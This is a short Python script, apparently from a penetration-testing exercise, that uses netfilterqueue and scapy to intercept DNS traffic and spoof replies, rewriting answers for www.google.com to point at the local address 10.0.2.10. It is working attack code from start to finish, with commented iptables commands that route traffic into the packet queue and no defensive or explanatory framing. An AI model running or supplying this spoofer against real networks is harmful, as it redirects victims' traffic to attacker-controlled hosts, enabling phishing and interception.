#!/usr/bin/env python
# ************************MY CODE**************************
import netfilterqueue
import scapy.all as scapy

# import os
# os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
# os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # print(qname)
        if b'www.google.com' in qname:
            print('[+] Spoofing DNS Response')
            answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.10')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
# os.system('iptables --flush')